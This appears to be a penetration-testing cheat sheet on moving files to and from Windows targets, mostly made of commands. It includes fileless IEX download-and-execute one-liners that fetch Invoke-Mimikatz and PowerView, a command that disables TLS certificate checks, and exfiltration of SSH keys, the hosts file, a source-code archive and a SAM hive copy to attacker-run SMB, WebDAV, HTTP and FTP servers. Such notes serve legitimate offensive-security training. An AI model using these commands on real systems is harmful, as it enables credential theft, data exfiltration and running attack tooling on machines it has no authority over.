## delete


# Attack to Target
## PowerShell Base64 Encode & Decode
**Attack Check SSH Key MD5 Hash**
```bash
$ md5sum id_rsa
```

**Attack Encode SSH Key to Base64**
```bash
$ cat id_rsa |base64 -w 0;echo
```

**Target Paste Base64**
```bash
PS > [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String(""))
```

**Confirming the MD5 Hashes Match**
```bash
PS > Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

## PowerShell Web Downloads
| Method                | Description                                                        |
|-----------------------|--------------------------------------------------------------------|
| OpenRead              | Returns the data from a resource as a Stream.                      |
| OpenReadAsync         | Returns the data from a resource without blocking the calling thread. |
| DownloadData          | Downloads data from a resource and returns a Byte array.           |
| DownloadDataAsync     | Downloads data from a resource and returns a Byte array without blocking the calling thread. |
| DownloadFile          | Downloads data from a resource to a local file.                    |
| DownloadFileAsync     | Downloads data from a resource to a local file without blocking the calling thread. |
| DownloadString        | Downloads a String from a resource and returns a String.           |
| DownloadStringAsync   | Downloads a String from a resource without blocking the calling thread. |

**File Download**
We can specify the class name Net.WebClient and the method DownloadFile with the parameters corresponding to the URL of the target file to download and the output file name.

```bash
PS > (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')


PS > (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

**Fileless Method**
As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX.

```bash
PS > IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')


PS > (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

**Invoke-WebRequest**
From PowerShell 3.0 onwards, the Invoke-WebRequest cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases iwr, curl, and wget instead of the Invoke-WebRequest full name.

```bash
PS > Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1`
```

**Common Errors with PowerShell**
There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download..
This can be bypassed using the parameter -UseBasicParsing.

```bash
PS > Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX`
```

Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:

```bash
PS > IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

PS > [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

## SMB Downloads
**Create the SMB Server**
```bash
$ sudo impacket-smbserver share -smb2support /tmp/smbshare
```

**Copy a File from the SMB Server**
New versions of Windows block unauthenticated guest access, as we can see in the following command:

```bash
C:\home> copy \\192.168.220.133\share\nc.exe

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```

To transfer files in this scenario, we can set a username and password using our Impacket SMB server and mount the SMB server on our windows target machine:

**Create the SMB Server with a Username and Password**
```bash
$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

**Mount the SMB Server with Username and Password**
```bash
C:\home> net use n: \\192.168.220.133\share /user:test test

C:\home> copy n:\nc.ex
```

`Note: You can also mount the SMB server if you receive an error when you use copy filename \\IP\sharename.

## FTP Downloads
**Setting up a Python3 FTP Server**
```bash
$ sudo python3 -m pyftpdlib --port 21
```

**Transfering Files from an FTP Server Using PowerShell**
```bash
PS > (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

When we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.

**Create a Command File for the FTP Client and Download the Target File**
```bash
C:\home> echo open 192.168.49.128 > ftpcommand.txt
C:\home> echo USER anonymous >> ftpcommand.txt
C:\home> echo binary >> ftpcommand.txt
C:\home> echo GET file.txt >> ftpcommand.txt
C:\home> echo bye >> ftpcommand.txt
C:\home> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye
```

# Target to Attack
## PowerShell Base64 Encode & Decode
**Encode File Using PowerShell**
```bash
PS > [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))


PS > Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

**Decode Base64 String in Linux**
```bash
$ echo = | base64 -d > hosts

$ md5sum hosts
```

## PowerShell Web Uploads
PowerShell doesn't have a built-in function for upload operations, but we can use Invoke-WebRequest or Invoke-RestMethod to build our upload function. We'll also need a web server that accepts uploads, which is not a default option in most common webserver utilities.

For our web server, we can use uploadserver, an extended module of the Python HTTP.server module, which includes a file upload page. 

**Installing a Configured WebServer with Upload**
```bash
$ pip3 install uploadserver
```

```bash
$ python3 -m uploadserver
```

Now we can use a PowerShell script [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses Invoke-RestMethod to perform the upload operations. The script accepts two parameters -File, which we use to specify the file path, and -Uri, the server URL where we'll upload our file. Let's attempt to upload the host file from our Windows host.

**PowerShell Script to Upload a File to Python Upload Server**
```bash
PS > IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

PS > Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

## PowerShell Base64 Web Upload
```bash
PS > $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))

PS > Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

```bash
$ nc -lvnp 8000

$ echo <base64> | base64 -d -w 0 > hosts
```

## SMB Uploads
### WebDav
**Installing WebDav Python modules**
```bash
$ sudo pip3 install wsgidav cheroot
```

**Using the WebDav Python module**
```bash
$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

**Connecting to the Webdav Share**
```bash
C:\home> dir \\192.168.49.128\DavWWWRoot
```

**Uploading Files using SMB**
```bash
C:\home> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```
### smbserver
**Creating a Share with smbserver.py**
```bash
$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

**Upload to Attack**
```bash
C:\home> copy sam.save \\10.10.15.16\CompData

C:\home> move sam.save \\10.10.15.16\CompData

C:\home> copy n:\nc.ex
```

## FTP Uploads
```bash
$ sudo python3 -m pyftpdlib --port 21 --write
```

### PowerShell Upload File
```bash
PS > (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

### Create a Command File for the FTP Client to Upload a File
```bash
C:\home> echo open 192.168.49.128 > ftpcommand.txt
C:\home> echo USER anonymous >> ftpcommand.txt
C:\home> echo binary >> ftpcommand.txt
C:\home> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\home> echo bye >> ftpcommand.txt
C:\home> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```

